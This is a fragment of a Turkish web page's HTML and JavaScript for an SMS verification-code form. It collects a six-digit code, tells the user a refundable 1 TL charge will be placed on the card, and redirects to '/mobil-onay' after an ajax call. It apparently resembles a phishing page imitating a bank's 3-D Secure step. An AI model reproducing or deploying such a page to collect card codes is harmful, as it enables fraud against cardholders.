                  ...
                  <div class="form-wrapper">
                     ...
                     <form id="sms_form" class="form-code" method="POST" autocomplete="off" action="javascript:;" novalidate="novalidate">
                        <div class="form-row">
                           ...
                           <input 3dsinput="password" type="text" class="f-input" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms" id="passwordfield" maxlength="6" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                        ...
                        <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                           ...
                           <div class="noscriptHelpText">
                              Doğrulama esnasında kartınızdan 1 TL'lik bir ön provizyon doğrulama işlemi yapılacaktır. Bu ücret doğrulamadan sonra iade edilecektir.
                           </div>
                        </div>
                        <div id="submitButtonDiv" style="display: block;">
                           <div class="has-submit">
                              <button id="submitbutton" type="submit" onclick="smsa()" name="otpType" value="confirm" class="button btn-1 btn-commit">Onayla</button>
                           </div>
        ...
        $.ajax({
            ...
            success: function(data) {
                ...
                if(data.status == "1") {
                    ...
                    window.location.href = "/mobil-onay";
                }
                else {
